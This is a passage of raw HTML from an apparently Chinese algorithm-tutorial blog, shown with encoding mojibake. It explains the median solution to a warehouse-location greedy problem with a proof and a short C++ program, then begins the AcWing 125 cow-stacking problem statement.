xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>100000</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1\le N\le 100000,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">100000</span><span class="mpunct">,</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo><msub><mi>A</mi><mi>i</mi></msub><mo>â‰¤</mo><mn>40000</mn></mrow><annotation encoding="application/x-tex">0\le A_i\le 40000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">40000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">6 2 9 1</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12</span><br></pre></td></tr></table></figure><h3 id="è´ªå¿ƒ-7">è´ªå¿ƒ</h3><p><strong>åšæ³•</strong> å–ä¸­ç‚¹ä½œä¸ºä»“åº“</p><blockquote><p>å¯¹äºå¥‡æ•°æ¥è¯´ï¼Œä¸­ç‚¹ä¸ºæœ€ä¸­é—´çš„ç‚¹<br>å¯¹äºå¶æ•°æ¥è¯´ï¼Œä¸­ç‚¹å¯ä»¥å–æœ€ä¸­é—´çš„ä¸¤ä¸ªç‚¹ä¸­çš„ä»»æ„ä¸€ä¸ªï¼Œæˆ–è€…äºŒè€…ä¹‹é—´ä»»æ„ç‚¹çš†å¯</p><p>åŒºé—´[left, right]çš„ä¸­ç‚¹ä¸º(left + right) &gt;&gt; 1, å› æ­¤è¿™é‡Œå–<code>a[n &gt;&gt; 1]</code>ä¸ºä¸­ç‚¹å³å¯</p></blockquote><p><strong>åˆ†æ</strong></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd class="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi mathvariant="normal">âˆ£</mi><mi>x</mi><mo>âˆ’</mo><msub><mi>x</mi><mn>1</mn></msub><mi mathvariant="normal">âˆ£</mi><mo>+</mo><mi mathvariant="normal">âˆ£</mi><mi>x</mi><mo>âˆ’</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">âˆ£</mi><mo>+</mo><mo>â‹¯</mo><mo>+</mo><mi mathvariant="normal">âˆ£</mi><mi>x</mi><mo>âˆ’</mo><msub><mi>x</mi><mi>n</mi></msub><mi mathvariant="normal">âˆ£</mi></mrow></mstyle></mtd><mtd class="mtr-glue"></mtd><mtd class="mml-eqn-num"></mtd></mtr><mtr><mtd class="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo stretchy="false">(</mo><mi mathvariant="normal">âˆ£</mi><mi>x</mi><mo>âˆ’</mo><msub><mi>x</mi><mn>1</mn></msub><mi mathvariant="normal">âˆ£</mi><mo>+</mo><mi mathvariant="normal">âˆ£</mi><mi>x</mi><mo>âˆ’</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">âˆ£</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mi mathvariant="normal">âˆ£</mi><mi>x</mi><mo>âˆ’</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">âˆ£</mi><mo>+</mo><mi mathvariant="normal">âˆ£</mi><mi>x</mi><mo>âˆ’</mo><msub><mi>x</mi><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow></msub><mi mathvariant="normal">âˆ£</mi><mo stretchy="false">)</mo><mo>+</mo><mo>â‹¯</mo></mrow></mstyle></mtd><mtd class="mtr-glue"></mtd><mtd class="mml-eqn-num"></mtd></mtr><mtr><mtd class="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¥</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mi>n</mi></msub><mo>âˆ’</mo><msub><mi>x</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow></msub><mo>âˆ’</mo><msub><mi>x</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mo>â‹¯</mo></mrow></mstyle></mtd><mtd class="mtr-glue"></mtd><mtd class="mml-eqn-num"></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align}    f(x) &amp;= |x-x_1|+|x-x_2|+\cdots + |x-x_n|\\&amp;=(|x-x_1| + |x-x_2|) + (|x-x_2|+|x-x_{n-1}|) +\cdots\\&amp;\ge(x_n - x_1)+(x_{n-1}-x_2)+\cdots \\ \end{align}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.5em;vertical-align:-2em;"></span><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">âˆ£</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">âˆ£</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">âˆ£</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">âˆ£</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner">â‹¯</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">âˆ£</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">âˆ£</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord">âˆ£</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">âˆ£</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">âˆ£</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">âˆ£</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord">âˆ£</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">âˆ£</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">âˆ£</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord">âˆ£</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner">â‹¯</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner">â‹¯</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span></span></span><span class="tag"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.5em;"><span class="pstrut" style="height:2.84em;"></span><span class="eqn-num"></span></span><span style="top:-3em;"><span class="pstrut" style="height:2.84em;"></span><span class="eqn-num"></span></span><span style="top:-1.5em;"><span class="pstrut" style="height:2.84em;"></span><span class="eqn-num"></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span></span></span></span></p><p>å½“xå–é‡ç‚¹æ—¶éƒ½èƒ½å–åˆ°ç­‰å·ï¼Œæ‰€ä»¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰¥</mo></mrow><annotation encoding="application/x-tex">\ge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mrel">â‰¥</span></span></span></span>åçš„å€¼å³ä¸ºæœ€å°å€¼ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(a, a + n);</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    res += <span class="built_in">abs</span>(a[i] - a[n &gt;&gt; <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ¨å…¬å¼">æ¨å…¬å¼</h1><h2 id="AcWing-125-è€æ‚æŠ€çš„ç‰›">AcWing 125. è€æ‚æŠ€çš„ç‰›</h2><p>å†œæ°‘çº¦ç¿°çš„ N å¤´å¥¶ç‰›ï¼ˆç¼–å·ä¸º 1â€¦Nï¼‰è®¡åˆ’é€ƒè·‘å¹¶åŠ å…¥é©¬æˆå›¢ï¼Œä¸ºæ­¤å®ƒä»¬å†³å®šç»ƒä¹ è¡¨æ¼”æ‚æŠ€ã€‚</p><p>å¥¶ç‰›ä»¬ä¸æ˜¯éå¸¸æœ‰åˆ›æ„ï¼Œåªæå‡ºäº†ä¸€ä¸ªæ‚æŠ€è¡¨æ¼”ï¼š</p><p>å ç½—æ±‰ï¼Œè¡¨æ¼”æ—¶ï¼Œå¥¶ç‰›ä»¬ç«™åœ¨å½¼æ­¤çš„èº«ä¸Šï¼Œå½¢æˆä¸€ä¸ªé«˜é«˜çš„å‚ç›´å †å ã€‚</p><p>å¥¶ç‰›ä»¬æ­£åœ¨è¯•å›¾æ‰¾åˆ°è‡ªå·±åœ¨è¿™ä¸ªå †å ä¸­åº”è¯¥æ‰€å¤„çš„ä½ç½®é¡ºåºã€‚</p><p>è¿™ N å¤´å¥¶ç‰›ä¸­çš„æ¯ä¸€å¤´éƒ½æœ‰ç€è‡ªå·±çš„é‡é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">W_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä»¥åŠè‡ªå·±çš„å¼ºå£®ç¨‹åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p>ä¸€å¤´ç‰›æ”¯æ’‘ä¸ä½çš„å¯èƒ½æ€§å–å†³äºå®ƒå¤´ä¸Šæ‰€æœ‰ç‰›çš„æ€»é‡é‡ï¼ˆä¸åŒ…æ‹¬å®ƒè‡ªå·±ï¼‰å‡å»å®ƒçš„èº«ä½“å¼ºå£®ç¨‹åº¦çš„å€¼ï¼Œç°åœ¨ç§°è¯¥æ•°å€¼ä¸ºé£é™©å€¼ï¼Œé£é™©å€¼è¶Šå¤§ï¼Œè¿™åªç‰›æ’‘ä¸ä½çš„å¯èƒ½æ€§è¶Šé«˜ã€‚</p><p>æ‚¨çš„ä»»åŠ¡æ˜¯ç¡®å®šå¥¶ç‰›çš„æ’åºï¼Œä½¿å¾—æ‰€æœ‰å¥¶ç‰›çš„é£é™©å€¼ä¸­çš„æœ€å¤§å€¼å°½å¯èƒ½çš„å°ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡Œè¾“å…¥æ•´æ•° Nï¼Œè¡¨ç¤ºå¥¶ç‰›æ•°é‡ã€‚</p><p>æ¥ä¸‹æ¥ N è¡Œï¼Œæ¯è¡Œè¾“å…¥ä¸¤ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºç‰›çš„é‡é‡å’Œå¼ºå£®ç¨‹åº¦ï¼Œç¬¬ i è¡Œè¡¨ç¤ºç¬¬ i å¤´ç‰›çš„é‡é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">W_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä»¥åŠå®ƒçš„å¼ºå£®ç¨‹åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å¤§é£é™©å€¼çš„æœ€å°å¯èƒ½å€¼ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>50000</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1â‰¤Nâ‰¤50000,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">50000</span><span class="mpunct">,</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>W</mi><mi>i</mi><mo>â‰¤</mo><mn>10</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1â‰¤Wiâ‰¤10,000,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal">Wi</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span><span class="mpunct">,</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>S</mi><mi>i</mi><mo>â‰¤</mo><mn>1</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo><mn>000</mn></mrow><annotation encoding="application/x-tex">1â‰¤Siâ‰¤1,000,000,000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" 